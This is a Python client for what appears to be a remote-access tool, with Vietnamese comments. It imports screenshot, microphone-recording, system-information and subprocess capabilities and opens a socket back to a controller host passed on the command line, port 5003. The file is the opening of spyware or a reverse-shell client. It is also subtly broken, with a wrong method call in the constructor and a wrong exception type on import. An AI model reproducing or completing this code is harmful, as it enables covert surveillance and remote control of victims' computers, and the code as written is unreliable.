import socket , os , subprocess , sys , re , platform , tqdm 
# platform : lấy thông tin về hệ thống 
from datetime import datetime
try:
    import pyautogui # dùng cho screenshot 
except KeyError:
    # nếu một vài máy không có màn hình - như server thì không cần import pyautogui
    pyautogui_imported = False
else:
    pyautogui_imported = True

import sounddevice as sd  # dùng để ghi âm 
from tabulate import tabulate # dùng để hiển thị bảng
from scipy.io import wavfile  # lưu recorded audio thành file wav
import psutil , GPUtil  # dùng để lấy thông tin về CPU và GPU 

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003 
BUFFER_SIZE = 1140 
SEPERATOR = "<sep>"

class Client :
    def __init__ (self , host , port , verbose = False) : 
        self.host = host 
        self.port = port
        self.verbose = verbose
        # kết nối đến server 
        self.socket = socket.connect_to_server()
        # thư mục hiện tại 
        self.cwd = None 
    def connect_to_server(self , custom_port = None) : 
        s = socket.socket()
        if custom_port :
            port = custom_port
        else :  
            port = self.port
        if self.verbose :
            print(f"[*] Connecting to {self.host}:{port}")
        s.connect((self.host , port))
        if self.verbose :
            print("[+] Connected.")
        return s 

